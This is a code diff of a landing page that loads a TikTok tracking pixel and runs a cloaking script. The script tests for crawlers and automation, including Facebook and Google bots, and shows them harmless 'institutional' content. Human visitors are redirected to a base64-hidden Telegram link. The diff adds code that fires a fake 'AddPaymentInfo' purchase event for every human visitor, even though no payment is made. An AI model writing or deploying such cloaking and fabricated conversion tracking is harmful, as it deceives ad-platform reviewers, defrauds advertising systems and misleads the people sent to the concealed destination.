@@ -9,11 +9,33 @@
   <!-- TikTok Pixel Code Start -->
   <script>
   !function (w, d, t) {
-    w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
-    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
-    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+    w.TiktokAnalyticsObject = t;
+    var ttq = w[t] = w[t] || [];
+    ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie"];
+    ttq.setAndDefer = function (t, e) {
+      t[e] = function () {
+        t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
+      }
+    };
+    for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
+    ttq.load = function (e, n) {
+      var i = "https://analytics.tiktok.com/i18n/pixel/events.js";
+      ttq._i = ttq._i || {};
+      ttq._i[e] = [];
+      ttq._i[e]._u = i;
+      ttq._t = ttq._t || {};
+      ttq._t[e] = +new Date;
+      ttq._o = ttq._o || {};
+      ttq._o[e] = n || {};
+      var a = document.createElement("script");
+      a.type = "text/javascript";
+      a.async = !0;
+      a.src = i + "?sdkid=" + e + "&lib=" + t;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(a, s);
+    };
 
-    ttq.load('D1M9Q43C77U75N55I240');
+    ttq.load('D1M9Q43C77U75N55I240'); // Seu ID Pixel
     ttq.page();
   }(window, document, 'ttq');
   </script>
@@ -50,26 +72,38 @@
     const isBot = () => {
       const n = navigator;
       return (
-        n.webdriver || 
-        !n.languages || 
+        n.webdriver ||
+        !n.languages ||
         n.languages.length === 0 ||
-        !n.plugins || 
+        !n.plugins ||
         n.plugins.length === 0 ||
         /bot|crawl|spider|facebook|google|Headless|PhantomJS/i.test(n.userAgent)
       );
     };
 
-    const redirect = () => {
-      const destino = atob("aHR0cHM6Ly90Lm1lL29jdWx0aW5ob3NmcmVl"); // https://t.me/ocultinhosfree
-      window.location.href = destino;
-    };
+    const destino = atob("aHR0cHM6Ly90Lm1lL29jdWx0aW5ob3NmcmVl"); // Telegram redirecionamento
 
     if (isBot()) {
-      // Mostra conteúdo institucional só para bots
       document.getElementById("white-content").style.display = "block";
     } else {
-      // Redireciona humano real com delay
-      setTimeout(redirect, 2500);
+      // Espera o pixel carregar antes de disparar o evento
+      function aguardaPixelETrigaEvento(tentativas) {
+        if (typeof ttq !== 'undefined' && typeof ttq.track === 'function') {
+          ttq.track('AddPaymentInfo');
+        } else if (tentativas < 10) {
+          setTimeout(function () {
+            aguardaPixelETrigaEvento(tentativas + 1);
+          }, 300);
+        }
+      }
+
+      setTimeout(function () {
+        aguardaPixelETrigaEvento(0);
+      }, 1000); // espera 1s para começar a checar o pixel
+
+      setTimeout(function () {
+        window.location.href = destino;
+      }, 4000); // redireciona após 4 segundos
     }
   </script>
 
